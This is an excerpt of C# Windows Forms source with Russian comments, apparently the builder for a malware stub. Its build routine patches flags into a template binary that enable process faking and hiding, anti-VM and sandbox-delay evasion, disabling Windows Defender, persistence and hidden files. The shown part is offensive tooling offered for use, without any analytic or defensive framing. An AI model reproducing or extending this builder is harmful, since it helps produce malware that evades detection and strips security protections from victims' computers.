    ...
    public partial class Form1 : Form
    {
        ...
        private void PatchVariable(byte[] data, string marker, string value)
        {
            ...
            for (int i = 0; i < data.Length - markerBytes.Length; i++)
            {
                ...
                if (found)
                {
                    ...
                    // Ищем размер буфера (до следующего маркера или до конца)
                    int maxLen = 0;
        ...
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                // ============================================================
                // ПАТЧИМ БУЛЕВЫ ПЕРЕМЕННЫЕ (как char)
                // ============================================================
                // Ищем позиции char-переменных по их маркерам в коде
                // Проще: ищем сами переменные в бинарнике по имени
                PatchVariable(template, "g_Algo", algoValue.ToString());
                PatchVariable(template, "g_FakeEnabled", chkFakeProcess.Checked ? "1" : "0");
                PatchVariable(template, "g_HideEnabled", chkHideProcess.Checked ? "1" : "0");
                PatchVariable(template, "g_AntiVM", chkAntiVM.Checked ? "1" : "0");
                PatchVariable(template, "g_DisableDefender", chkDisableDefender.Checked ? "1" : "0");
                PatchVariable(template, "g_Persistence", chkAddPersistence.Checked ? "1" : "0");
                PatchVariable(template, "g_HideFiles", chkHideFilesAttr.Checked ? "1" : "0");
                PatchVariable(template, "g_SandboxDelay", chkSandboxDelay.Checked ? "1" : "0");
